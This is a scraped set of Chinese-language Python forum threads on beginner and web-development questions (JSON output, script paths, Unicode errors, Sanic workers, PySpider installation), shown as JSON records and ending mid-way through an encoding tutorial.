{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的是 win7,64 位,安装 python2.7,32 位.<br>\n顺利安装了 pyqt4,正常使用,没有什么异常.<br>\n安装 spynner,也很顺利.<br>\n但是,就是 spynner 会自动闪退.代码不关闭浏览器,就自动关闭.<br>\n其他都正常使用.<br>\n请问闪退是什么情况呢?<br>\n怎么解决?</p>\n</div></div>"], "reply": "1", "tittle": "请问 spynner 闪退是什么情况?怎么解决?", "comment": ["没用过 spynner ，抓取动态页面可以尝试下  selenium"]},
{"content": ["<div class=\"topic_content\">想通过 python 脚本来 读取一个表格内的数据 。以 json 格式输出 ，但是这个数据需要以“,”隔开。如 ： <a target=\"_blank\" href=\"http://www.baidu.com,port,80\" rel=\"nofollow\">www.baidu.com,port,80</a>  。 隔开的数据是用来传参数的 ，所以不能当字符串输出。</div>"], "reply": "8", "tittle": "Python 输出 json 格式问题", "comment": ["每个汉字都认识，就是不知所云", "意思是，楼主 json 键对应的值里面不能有逗号，所以不知道应该怎么存放这个数据吧？\r", "事实上， json 键对应的值是可以有逗号的\r", "'''\r", "{\r", "    \"urls\": \"a,b,c\"\r", "}\r", "'''\r", "这样写是没有问题的。\r", "当然做嵌套也是可以的。\r", "'''\r", "{\r", "    \"urls\": [\r", "        {\r", "            \"url\": \"www.baidu.com\",\r", "            \"port\": \"80\"\r", "        },\r", "        {\r", "            \"url\": \"www.163.com\",\r", "            \"port\": \"80\"\r", "        }\r", "    ]\r", "}\r", "'''", " 第一个数据出来的话就成了字符串了。。。第二个可以试试", "本想吐槽……", " 字符串出来自己转换一下不就得了， python 的 split 函数那么方便。\r", "'", "\r", "马上就能转成 list 用了，需要转换成数字的元素自己用 int 转换一下不就得了？一样很方便。", "  谢谢，我试试", " 你好，还想请教下，因为我是 print.dumps （）来输出的，请问下 .split 这个加在那个位置？\r", "脚本内容 ：\r", "#!/usr/bin/env python\r", "#encoding=utf8\r", "import os\r", "import json\r", "active_url = file('/etc/zabbix/script/discovery/active_url.txt')\r", "d01 = []\r", "for url in active_url.readlines():\r", "    d01.append({\"{#SITEURL}\": url.strip()})\r", "print json.dumps({'data': d01}, sort_keys=True, indent=4,)", " 不能理解你想要干什么。 json.dumps 出来就已经是 json 格式了，还要 split 干嘛？\r", "如果不知道自己在干什么，建议在仔细阅读有关说明或者自己调试一下。\r", "顺便，建议你好好提高一下提问技巧。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如：\npython3  <a href=\"http://xxx.py\" rel=\"nofollow\">xxx.py</a>\n是否可以将脚本 <a href=\"http://xxx.py\" rel=\"nofollow\">xxx.py</a> 放入某个目录中，执行时不需输入其绝对路径呢？\n新手，谢谢各位。</p>\n</div></div>"], "reply": "6", "tittle": "mac 终端中执行 Python 脚本时如何不输入脚本所在位置的绝对路径", "comment": ["1. chmod u+x 脚本加上可执行权限\r", "2. 脚本文件头加上如下代码\r", "\r", "#! /usr/bin/envy python\r", "# coding: utf-8\r", "把脚本放入系统环境变量的路径中即可\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 python Linux 学习群， qq 群号： 278529278 ，非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "楼上的方法，或者：\r", "alias command=python3 xxx/xx.py", "一楼有 typo \r", "我建议楼主 Google shebang\r", "然后 man chmod\r", "\r", "然后就什么都明白了", "奥，还有 PATH", "去查查系统环境变量是干嘛用的。\r", "\r", "为什么你输入 ls ，就执行了 ls 命令\r", "试一试 \r", "> which ls", "谢谢各位大神，你们太友善了。"]},
{"content": ["<div class=\"topic_content\">大神们：\r<br>\r<br>我想把 htm 文件中的第一个&lt;link 到第二个&lt;link 之间的所有内容另存为一个 htm 该怎么写比较简洁。\r<br>\r<br>\r<br>\r<br>&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\r<br>\r<br>&lt;link rel=\"prefetch\" href=\"https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js\"&gt;\r<br>\r<br>&lt;meta name=\"application-name\" content=\"Python.org\"&gt;\r<br>&lt;meta name=\"msapplication-tooltip\" content=\"The official home of the Python Programming Language\"&gt;\r<br>&lt;meta name=\"apple-mobile-web-app-title\" content=\"Python.org\"&gt;\r<br>&lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\"&gt;\r<br>&lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"&gt;\r<br>\r<br>&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\r<br>&lt;meta name=\"HandheldFriendly\" content=\"True\"&gt;\r<br>&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;\r<br>&lt;meta http-equiv=\"cleartype\" content=\"on\"&gt;\r<br>&lt;meta http-equiv=\"imagetoolbar\" content=\"false\"&gt;\r<br>\r<br>&lt;script type=\"text/javascript\" async=\"\" src=\"https://ssl.google-analytics.com/ga.js\"&gt;&lt;/script&gt;&lt;script src=\"./Welcome to Python.org_files/modernizr.js.下载\"&gt;&lt;/script&gt;&lt;style type=\"text/css\" adt=\"123\"&gt;&lt;/style&gt;\r<br>\r<br>&lt;link href=\"./Welcome to Python.org_files/style.css\" rel=\"stylesheet\" type=\"text/css\" title=\"default\"&gt;\r<br>&lt;link href=\"./Welcome to Python.org_files/mq.css\" rel=\"stylesheet\" type=\"text/css\" media=\"not print, braille, embossed, speech, tty\"&gt;\r<br>\r<br>\r<br>\r<br>\r<br>\r<br>\r<br>提取的内容应该是：\r<br>\r<br>\r<br>\r<br>&lt;link rel=\"prefetch\" href=\"https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js\"&gt;\r<br>\r<br>&lt;meta name=\"application-name\" content=\"Python.org\"&gt;\r<br>&lt;meta name=\"msapplication-tooltip\" content=\"The official home of the Python Programming Language\"&gt;\r<br>&lt;meta name=\"apple-mobile-web-app-title\" content=\"Python.org\"&gt;\r<br>&lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\"&gt;\r<br>&lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"&gt;\r<br>\r<br>&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\r<br>&lt;meta name=\"HandheldFriendly\" content=\"True\"&gt;\r<br>&lt;meta name=\"format-detection\" content=\"telephone=no\"&gt;\r<br>&lt;meta http-equiv=\"cleartype\" content=\"on\"&gt;\r<br>&lt;meta http-equiv=\"imagetoolbar\" content=\"false\"&gt;\r<br>\r<br>&lt;script type=\"text/javascript\" async=\"\" src=\"https://ssl.google-analytics.com/ga.js\"&gt;&lt;/script&gt;&lt;script src=\"./Welcome to Python.org_files/modernizr.js.下载\"&gt;&lt;/script&gt;&lt;style type=\"text/css\" adt=\"123\"&gt;&lt;/style&gt;\r<br>\r<br>&lt;link</div>"], "reply": "2", "tittle": "Python 处理文件内容的正确姿势该怎样？", "comment": ["xpath  or regex", "'<link'  + html.split('<link')[1]\r", "手机打的没测试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/messense/sanic-gunicorn\" rel=\"nofollow\">https://github.com/messense/sanic-gunicorn</a></p>\n<p>也给官方发了一个 PR: <a href=\"https://github.com/channelcat/sanic/pull/545\" rel=\"nofollow\">https://github.com/channelcat/sanic/pull/545</a></p>\n</div></div>"], "reply": "10", "tittle": "Gunicorn worker for Sanic", "comment": ["弱弱的问一句， Gunicorn 自带的 AiohttpWorker 不能运行 sanic?", "66666", " 好像 aiohttp 的速度不够快啊，不过我也没试……待验证。", " 根本起不来\r", "\r", "gunicorn simple_server:app --bind localhost:8000 --worker-class gaiohttp --capture-output\r", "[2017-03-20 20:13:34 +0800] [3226] [INFO] Starting gunicorn 19.6.0\r", "[2017-03-20 20:13:34 +0800] [3226] [INFO] Listening at: ", " (3226)\r", "[2017-03-20 20:13:34 +0800] [3226] [INFO] Using worker: gaiohttp\r", "[2017-03-20 20:13:34 +0800] [3260] [INFO] Booting worker with pid: 3260\r", "Application object must be callable.\r", "[2017-03-20 20:13:34 +0800] [3260] [INFO] Worker exiting (pid: 3260)\r", "[2017-03-20 20:13:34 +0800] [3226] [INFO] Shutting down: Master\r", "[2017-03-20 20:13:34 +0800] [3226] [INFO] Reason: App failed to load.\r", "\r", "也需要一些 hack ，比如类似： ", "\r", "\r", "或者自己实现下 __call__", "  #4 actually ，即便实现了 __call__ 也不好继续下去，因为 Sanic 并不兼容 WSGI ， gunicorn 的 gaiohttp worker 是基于 WSGI 的", " aiohttp 2.0 也废弃了 WSGI 支持，估计以后 gaiohttp 也没法用了。\r", "\r", "问一下 sanic 跑同步的 wsgi 不会浪费性能吗", " #7 并不是同步跑 WSGI ，自定义 gunicorn worker 跑 asyncio event loop", "ORM 支持怎么样了？楼主有打算在生产环境用 sanic 吗？", " #9 ORM 支持不咋的，有在生产环境使用，一个并不涉及到数据库的项目：\r", "\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求推荐有几个这些功能的库：</p>\n<p>1 ，资源抽象，这里的资源主要是几个相同对象，不是硬件，比如 requests 的 session</p>\n<p>2 ，根据时间的资源使用，比如一个 session 十秒钟只使用一次</p>\n<p>3 ，资源占用抽象，占用中的资源不可重复使用</p>\n<p>4 ，任务输入和结果输出的接口</p>\n<p>谢谢啦 :)</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "Python \"负载均衡\"", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好\n<br>作为一个很懒的肥宅，有多懒呢？</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/118023-9e8086013a4fc42e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>每次找到好图都想右键！\n<br>嗯，听说爬虫很厉害\n<br>好的！\n<br>我要做个爬虫扒图！\n<br>...\n<br>5 个月后，也就是今天，我还只会安装 python...\n<br>感觉不行动的话又会过去 5 个月 /微笑\n<br>所以！\n<br>从今天开始做一个长期挑战 : Python 学习周记\n<br>即是将学习笔记整理发布！并尽可能<strong>不断更</strong>，先定一个小目标，独立写出自动筛选扒图存盘的虫虫</p>\n<p><em>按照惯例都是从安装配置环境开始一步步讲，可是我已经无数次从头学习 Hello world...这次想换一下</em></p>\n<hr>\n<h1>路线</h1>\n<ul>\n<li>\n<p><a href=\"https://github.com/Yixiaohan/show-me-the-code/blob/master/README.md\" rel=\"nofollow\">Git - 每天一个小程序</a></p>\n</li>\n<li>\n<p><a href=\"https://www.zhihu.com/question/29372574\" rel=\"nofollow\">知乎 - Python 的练手项目有哪些值得推荐？</a></p>\n</li>\n</ul>\n<p>后续增加...</p>\n<h1>方法</h1>\n<p>根据实际问题展开学习，解构知识路径</p>\n<h1>声明</h1>\n<ul>\n<li>想到哪写到哪</li>\n<li>使用 Python3.6</li>\n<li>我比较菜鸡（都不会），日记各种不完美</li>\n<li>没有啦</li>\n</ul>\n<hr>\n<p>那么，开始吧！\n<br>第 0000 题：将你的 QQ 头像（或者微博头像）右上角加上红色的数字，类似于微信未读信息数量那种提示效果。 类似于图中效果</p>\n<p><img alt=\"\" src=\"http://upload-images.jianshu.io/upload_images/118023-38771a0de8f16a71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<ul>\n<li>搜索获得<a href=\"http://www.jianshu.com/p/05e3973a77ed\" rel=\"nofollow\">教程</a></li>\n</ul>\n<p>方法是调用一个图形处理库 PIL （不支持 Python3 ，所以改用 Pillow ）进行处理</p>\n<ul>\n<li>我用的版本是 3.6 ， Win 上命令安装无效，所以找到<a href=\"https://pypi.python.org/pypi/Pillow/4.0.0#downloads\" rel=\"nofollow\">Pillow 下载页</a>选择合适版本下载安装即可</li>\n</ul>\n<p><img alt=\"pypi\" src=\"http://upload-images.jianshu.io/upload_images/118023-05203dd06c1bbc4f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<ul>\n<li>执行</li>\n</ul>\n<p><img alt=\"思路\" src=\"http://upload-images.jianshu.io/upload_images/118023-c9fcfb293232f463.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<pre><code>from PIL import Image, ImageDraw, ImageFont, ImageColor\ndef add_num(img):\n    draw = ImageDraw.Draw(img)\n    myfont = ImageFont.truetype('C:/windows/fonts/calibri.ttf',size=40)\n    fillcolor = ImageColor.colormap.get('red')\n    width,height = img.size\n    draw.text((width-30,0),'2',font=myfont,fill=fillcolor)\n    img.save('result.jpg','jpeg')\n    return 0\nif __name__ == '__main__':\n    image = Image.open('test.jpg')\n    add_num(image)\n</code></pre>\n<p><img alt=\"result\" src=\"http://upload-images.jianshu.io/upload_images/118023-c9bf21196558fb43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<ul>\n<li>遇到的问题</li>\n</ul>\n<p>不能调用字体文件名带中文的字体</p>\n<ul>\n<li>另外</li>\n</ul>\n<p>关于<code>return 0</code>\nreturn 语句用来从函数中 return(返回)，也就是说跳出函数\n<br><a href=\"http://c.biancheng.net/cpp/html/1832.html\" rel=\"nofollow\">延展阅读： Python return 语句</a></p>\n<p>关于<code>if __name__ == '__main__':</code>\n让你写的脚本模块既可以导入到别的模块中用，另外该模块自己也可执行\n<br><a href=\"http://www.jb51.net/article/51892.htm\" rel=\"nofollow\">延展阅读：浅析 python 中__name__ = '<strong>main</strong>' 的作用</a></p>\n<p>关于 Pillow\n<br>详细<a href=\"https://pillow.readthedocs.org/\" rel=\"nofollow\">Pillow 官方文档</a></p>\n<hr>\n<p>ok ！本周完结！本来的基础只能写 if 、 while 的小循环。看调用 from import 貌似也能明白点，但是强行看代码遇到的麻烦也不是一点半点，整体花费时间也不少，好在还是动手了。\n周末研究下怎么做出来真实的通知小气泡，比如这样</p>\n<p><img alt=\"QQ\" src=\"http://upload-images.jianshu.io/upload_images/118023-37b665daa8e329e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p>拜拜~</p>\n</div></div>"], "reply": "15", "tittle": "Python 周记/Week 0", "comment": ["感谢分享， win 下安装库真蛋疼", "用 pip 啊，很多编译麻烦的库都提前编译好了，完全没压力好么。。。。。。", " 3.6 不知道为什么用不了 pip ，所以我才改用 exe", "怎么是从这个开始？", " 应该从爬虫开始么哈哈", " 是啊，我也开始要写了，看了一两天语法了", " 那你加油，我想绕一圈再去写，我现在的水平稍微复杂的代码都得搜一下才明白", " 是不是提示找不到 pip 可执行程序？试试`python3 -m pip install 包名`呢", " 好的，明早醒来试试", " 嘻嘻(◍•ᴗ•◍)", " 试过了，还是不行", " 报的什么错？", " \r", "```\r", "Traceback (most recent call last):\r", "  File \"C:\\Program Files\\Python36\\lib\\site-packages\\PIL\\ImageFont.py\", line 238, in truetype\r", "    return FreeTypeFont(font, size, index, encoding)\r", "  File \"C:\\Program Files\\Python36\\lib\\site-packages\\PIL\\ImageFont.py\", line 127, in __init__\r", "    self.font = core.getfont(font, size, index, encoding)\r", "OSError: cannot open resource\r", "\r", "During handling of the above exception, another exception occurred:\r", "\r", "Traceback (most recent call last):\r", "  File \"C:\\Users\\电扇君\\Desktop\\Python 周记\\Week0\\img.py\", line 12, in <module>\r", "    add_num(image)\r", "  File \"C:\\Users\\电扇君\\Desktop\\Python 周记\\Week0\\img.py\", line 4, in add_num\r", "    myfont = ImageFont.truetype('C:/windows/fonts/明兰 light',size=40)\r", "  File \"C:\\Program Files\\Python36\\lib\\site-packages\\PIL\\ImageFont.py\", line 273, in truetype\r", "    return FreeTypeFont(fontpath, size, index, encoding)\r", "  File \"C:\\Program Files\\Python36\\lib\\site-packages\\PIL\\ImageFont.py\", line 127, in __init__\r", "    self.font = core.getfont(font, size, index, encoding)\r", "OSError: cannot open resource\r", "```", "加油吧，慢慢来~", " 嘻嘻"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>语言(python)\n现在有这么一种情况。\n\nweb 框架 响应 来自客户端的请求的 handler 里面会返回一个列表记录 list1,\n对于 list1 的第一个元素 ele1 要请求 url1,\nlist1 的第二个元素 ele2 要请求 url2,\n以此类推，平均一个 url 请求要 200-300ms ，超时调成 1s\n所以如果 list1 的长度为 10 的话，如果迭代请求的话，总时间为 5S 左右。\n你们是怎么处理这种情况的？\n\n</code></pre>\n</div></div>"], "reply": "12", "tittle": "web 框架里面并发请求多个外部 url 怎么办？", "comment": ["那就并发请求然后 wait 到所有请求完成呗", "这个时候适合用 tornado 的 ayncHttpClient 啦 ", "\r", "\r", " 接受传入 loop, 非 tornado 框架也可以使用\r", "比如", " 用 multiprocess?", "gevent 的话用 grequests", "如果你的框架是 tornado ， 可以用它的 AsyncHttpClient \r", "如果你的框架是 flask ，把这些 url 请求任务丢到 celery ，把请求情况保存到 redis ，所有请求都完成了再回调", "并发请求之后合并结果", "如果是因为网慢或者 response 大的话。。。即使请求并发了，结果还是快不起来", "这种情况的话，我们一般用这个 [Go.IoT]( ", ") 做一个中间件，\r", "可以同时触发多个 http 请求，全都完成后执行下一步。\r", "\r", "参考：[异步多线请求]( ", ")", " 效果是你那种效果，难道 golang 也需要中间件来完成这种功能吗", " 当然不是。这个东东适用于那种需要经常更改的逻辑，如果是写好放在那很久都不会懂它，自然用原生的组件来完成会更漂亮，比如 golang 。", "多线程也行啊", "难道不是 gevent?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本周四晚八点，干货满满的机器学习直播分享~</p>\n<p>主题：机器学习的新手攻略与职业发展</p>\n<p>时间： 3 月 23 日（周四）晚 8 点</p>\n<p>特邀嘉宾：彭垚，七牛 AI 实验室创始负责人</p>\n<p>形式：话题分享+互动问答，建议提前准备好感兴趣的问题，互动问答环节时向嘉宾提问~</p>\n<p>本次分享你将 Get 到：</p>\n<p>1.机器学习需要的技术背景；</p>\n<p>2.机器学习不同职业路径对应的学习路线；</p>\n<p>3.机器学习的个人与未来。</p>\n<p>直播报名链接： <a href=\"http://boolan.com/\" rel=\"nofollow\">http://boolan.com/</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "直播分享|机器学习的新手攻略与职业发展", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>又看到一个关于爬虫的帖子，嘻嘻，收录待用，修改转载已取得<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权</em></p>\n<hr>\n<p>大家好，本篇文章为大家讲解腾讯云主机上 PySpider 爬虫框架的安装。</p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1489602983716_6115_1489602984767.jpeg\"></p>\n<p>首先，在此附上项目的地址，以及官方文档</p>\n<p><a href=\"https://github.com/binux/pyspider\" rel=\"nofollow\">PySpider</a></p>\n<p><a href=\"http://docs.pyspider.org/en/latest/\" rel=\"nofollow\">官方文档</a></p>\n<h2>安装流程</h2>\n<h3>pip</h3>\n<p>首先确保你已经安装了 pip ，若没有安装，请参照<a href=\"http://pip-cn.readthedocs.org/en/latest/installing.html\" rel=\"nofollow\">此文</a></p>\n<h3>phantomjs</h3>\n<p>PhantomJS 是一个基于 WebKit 的服务器端 JavaScript API 。它全面支持 web 而不需浏览器支持，其快速、原生支持各种 Web 标准： DOM 处理、 CSS 选择器、 JSON 、 Canvas 和 SVG 。 PhantomJS 可以用于页面自动化、网络监测、网页截屏以及无界面测试等。</p>\n<p><a href=\"http://phantomjs.org/download.html\" rel=\"nofollow\">安装方式</a></p>\n<p>以上附有官方安装方式，如果你是 Ubuntu ，还可以使用如下命令:</p>\n<pre><code>sudo apt-get install phantomjs\n\n</code></pre>\n<h3>pyspider</h3>\n<p>直接运行 pip 安装即可</p>\n<pre><code>pip install pyspider\n\n</code></pre>\n<h2>测试</h2>\n<p>安装完成之后，如果没有任何的报错，那就 OK</p>\n<p>命令行输入</p>\n<pre><code>pyspider all\n\n</code></pre>\n<p>然后浏览器访问 <a href=\"http://localhost:5000\" rel=\"nofollow\">http://localhost:5000</a></p>\n<p>观察一下效果，如果可以正常出现 PySpider 的页面，那证明一切 OK</p>\n<p>在此附图一张，这是我写了几个爬虫之后的界面。</p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1489602955452_8702_1489602956431.png\"></p>\n<hr>\n<p><em>原文来自： <a href=\"https://www.qcloud.com/community/user/542010001488460189\" rel=\"nofollow\">https://www.qcloud.com/community/user/542010001488460189</a></em></p>\n</div></div>"], "reply": "4", "tittle": "玩法收藏/云服务器/Python3 环境安装 PySpider 爬虫框架", "comment": ["• 这里绝对不会全文转载任何文章，而只会以链接方式分享", " 如果是作者，那就可以了吧", " #2 又看到一个关于爬虫的帖子，嘻嘻，收录待用，修改转载已取得腾讯云授权", " 抱歉才看到使用须知，转载仅供自用，有人感兴趣一起看也好。本以为已申请到腾讯云授权就没事了，之后我会只对文章进行摘抄，以免有违规嫌疑。"]},
{"content": ["<div class=\"topic_content\">class Aaa():\r<br>\tdef __init__(self,name):\r<br>\t\tself.name=name\r<br>\r<br>\tdef ddd(self):\r<br>\t\tprint(self.name+\" bbbbbbb\")\r<br>\r<br>\t\t\r<br>ccc=Aaa(name='aaa')\r<br>ccc.ddd()\r<br>\r<br>class Bbb(Aaa):\r<br>\tdef __init__(self,name):\r<br>\t\tsuper().__init__(name)\r<br>\r<br>\r<br>\r<br>\r<br>myccc=Qqqqq(name='hhh')\r<br>myccc.ddd()\r<br>\r<br>\r<br>\r<br>求大佬指教到底哪里出了问题。。</div>"], "reply": "1", "tittle": "是我电脑坏了还是语法真的有问题。。", "comment": ["悬赏 5 块人民币好吧，微信支付宝都行=。="]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>据说，每个做 Python 开发的都被字符编码的问题搞晕过，最常见的错误就是 UnicodeEncodeError 、 UnicodeDecodeError ，你好像知道怎么解决，遗憾的是，错误又出现在其它地方，问题总是重蹈覆辙， str 到 unicode 之间的转换用 decode 还是 encode 方法还特不好记，老是混淆，问题究竟出在哪里？</p>\n<p>为了弄清楚这个问题，我决定从 python 字符串的构成以及字符编码的细节上进行深入浅出的分析</p>\n<h3>字节与字符</h3>\n<p>计算机存储的一切数据，文本字符、图片、视频、音频、软件都是由一串 01 的字节序列构成的，一个字节等于 8 个比特位。</p>\n<p>而字符就是一个符号，比如一个汉字、一个英文字母、一个数字、一个标点都可以称为一个字符。</p>\n<p>字节方便存储和网络传输，而字符用于显示，方便阅读。例如字符 \"p\" 存储到硬盘是一串二进制数据 <code>01110000</code>，占用一个字节的长度</p>\n<h3>编码与解码</h3>\n<p>我们用编辑器打开的文本，看到的一个个字符，最终保存在磁盘的时候都是以二进制字节序列形式存起来的。那么从字符到字节的转换过程就叫做编码（ encode ），反过来叫做解码（ decode ），两者是一个可逆的过程。编码是为了存储传输，解码是为了方便显示阅读。</p>\n<p>例如字符 \"p\" 经过编码处理保存到硬盘是一串二进制字节序列 01110000 ，占用一个字节的长度。字符 \"禅\" 有可能是以 \"11100111 10100110 10000101\" 占用 3 个字节的长度存储，为什么说是有可能呢？这个放到后面再说。</p>\n<p>Python 的编码为什么那么蛋疼？当然，这不能怪开发者。</p>\n<p>这是因为 Python2 使用 ASCII 字符编码作为默认编码方式，而 ASCII 不能处理中文，那么为什么不用 UTf-8 呢？因为 Guido 老爹为 Python 编写第一行代码是在 1989 年的冬天， 1991 年 2 月正式开源发布了第一个版本，而 Unicode 是 1991 年 10 月发布的，也就是说 Python 这门语言创立的时候 UTF-8 还没诞生，这是其一。</p>\n<p>Python 把字符串的类型还搞成两种， unicode 和 str ，以至于把开发者都弄糊涂了，这是其二。 python3 彻底把 字符串重新改造了，只保留一种类型，这是后话，以后再说。</p>\n<h3>str 与 unicode</h3>\n<p>Python2 把字符串分为 unicode 和 str 两种类型。本质上 str 是一串二进制字节序列，下面的示例代码可以看出 str 类型的 \"禅\" 打印出来是十六进制的 \\xec\\xf8 ，对应的二进制字节序列就是 '11101100 11111000'。</p>\n<pre><code>&gt;&gt;&gt; s = '禅'\n&gt;&gt;&gt; s\n'\\xec\\xf8'\n&gt;&gt;&gt; type(s)\n&lt;type 'str'&gt;\n</code></pre>\n<p>而 unicode 类型的 u\"禅\" 对应的 unicode 符号是 u'\\u7985'</p>\n<pre><code>&gt;&gt;&gt; u = u\"禅\"\n&gt;&gt;&gt; u\nu'\\u7985'\n&gt;&gt;&gt; type(u)\n&lt;type 'unicode'&gt;\n</code></pre>\n<p>我们要把 unicode 符号保存到文件或者传输到网络就需要经过编码处理转换成 str 类型，于是 python 提供了 encode 方法，从 unicode 转换到 str ，反之亦然。</p>\n<p><img alt=\"python2-str\" src=\"https://mmbiz.qlogo.cn/mmbiz_jpg/rO1ibUkmNGMm3kIjKxdrhLvF7n7XW6PCDcLibkAFos3A6D27B06jvE2kn1zkVdGvUFzZZ9iarNq93jLthiaUCWsKBA/0?wx_fmt=jpeg\"></p>\n<p>encode</p>\n<pre><code>&gt;&gt;&gt; u = u\"禅\"\n&gt;&gt;&gt; u\nu'\\u7985'\n&gt;&gt;&gt; u.encode(\"utf-8\")\n'\\xe7\\xa6\\x85'\n</code></pre>\n<p>decode</p>\n<pre><code>&gt;&gt;&gt; s = \"禅\"\n&gt;&gt;&gt; s.decode(\"utf-8\")\nu'\\u7985'\n&gt;&gt;&gt;\n</code></pre>\n<p>不少初学者怎么也记不住 str 与 unicode 之间的转换用 encode 还是 decode ，如果你记住了 str 本质上其实是一串二进制数据，而 unicode 是字符（符号），编码（ encode ）就是把字符（符号）转换为 二进制数据的过程，因此 unicode 到 str 的转换要用 encode 方法，反过来就是用 decode 方法。</p>\n<blockquote>\n<p>encoding always takes a Unicode string and returns a bytes sequence, and decoding always takes a bytes sequence and returns a Unicode string\".</p>\n</blockquote>\n<p>清楚了 str 与 unicode 之间的转换关系之后，我们来看看什么时候会出现 UnicodeEncodeError 、 UnicodeDecodeError 错误。</p>\n<h3>UnicodeEncodeError</h3>\n<p>UnicodeEncodeError 发生在 unicode 字符串转换成 str 字节序列的时候，来看一个例子，把一串 unicode 字符串保存到文件</p>\n<pre><code># -*- coding:utf-8 -*-\ndef main():\n    name = u'Python 之禅'\n    f = open(\"output.txt\", \"w\")\n    f.write(name)\n</code></pre>\n<p>错误日志</p>\n<blockquote>\n<p>UnicodeEncodeError: 'ascii' codec can't encode characters in position 6-7: ordinal not in range(128)</p>\n</blockquote>\n<p>为什么会出现 UnicodeEncodeError ？</p>\n<p>因为调用 write 方法时， Python 会先判断字符串是什么类型，如果是 str ，就直接写入文件，不需要编码，因为 str 类型的字符串本身就是一串二进制的字节序列了。</p>\n<p>如果字符串是 unicode 类型，那么它会先调用 encode 方法把 unicode 字符串转换成二进制形式的 str 类型，才保存到文件，而 encode 方法会使用 python 默认的 ascii 码来编码</p>\n<p>相当于：</p>\n<pre><code>&gt;&gt;&gt; u\"Python 之禅\".encode(\"ascii\")\n</code></pre>\n<p>但是，我们知道 ASCII 字符集中只包含了 128 个拉丁字母，不包括中文字符，因此 出现了 'ascii' codec can't encode characters 的错误。要正确地使用 encode ，就必须指定一个包含了中文字符的字符集，比如： UTF-8 、 GBK 。</p>\n<pre><code>&gt;&gt;&gt; u\"Python 之禅\".encode(\"utf-8\")\n'Python\\xe4\\xb9\\x8b\\xe7\\xa6\\x85'\n\n&gt;&gt;&gt; u\"Python 之禅\".encode(\"gbk\")\n'Python\\xd6\\xae\\xec\\xf8'\n</code></pre>\n<p>所以要把 unicode 字符串正确地写入文件，就应该预先把字符串进行 UTF-8 或 GBK 编码转换。</p>\n<pre><code>def main():\n    name = u'Python 之禅'\n    name = name.encode('utf-8')\n    with open(\"output.txt\", \"w\") as f:\n    \tf.write(name)\n</code></pre>\n<p>当然，把 unicode 字符串正确地写入文件不止一种方式，但原理是一样的，这里不再介绍，把字符串写入数据库，传输到网络都是同样的原理</p>\n<h3>UnicodeDecodeError</h3>\n<p>UnicodeDecodeError 发生在 str 类型的字节序列解码成 unicode 类型的字符串时</p>\n<pre><code>&gt;&gt;&gt; a = u\"禅\"\n&gt;&gt;&gt; a\nu'\\u7985'\n&gt;&gt;&gt; b = a.encode(\"utf-8\")\n&gt;&gt;&gt; b\n'\\xe7\\xa6\\x85'\n&gt;&gt;&gt; b.decode(\"gbk\")\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeDecodeError: 'gbk' codec can't decode byte 0x85 in position 2: incomplete multibyte sequence\n</code></pre>\n<p>把一个经过 UTF-8 编码后生成的字节序列 '\\xe7\\xa6\\x85' 再用 GBK 解码转换成 unicode 字符串时，出现 UnicodeDecodeError ，因为 （对于中文字符） GBK 编码只占用两个字节，而 UTF-8 占用 3 个字节，用 GBK 转换时，还多出一个字节，因此它没法解析。避免 UnicodeDecodeError 的关键是保持 编码和解码时用的编码类型一致。</p>\n<p>这也回答了文章开头说的字符 \"禅\"，保存到文件中有可能占 3 个字节，有可能占 2 个字节，具体处决于 encode 的时候指定的编码格式是什么。</p>\n<p>再举一个 UnicodeDecodeError 的例子</p>\n<pre><code>&gt;&gt;&gt; x = u\"Python\"\n&gt;&gt;&gt; y = \"之禅\"\n&gt;&gt;&gt; x + y\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)\n&gt;&gt;&gt;\n</code></pre>\n<p>str 与 unicode 字符串 执行 + 操作是， Python 会把 str 类型的字节序列隐式地转换成（解码）成 和 x 一样的 unicode 类型，但 Python 是使用默认的 ascii 编码来转换的，而 ASCII 中不包含中文，所以报错了。</p>\n<pre><code>&gt;&gt;&gt; 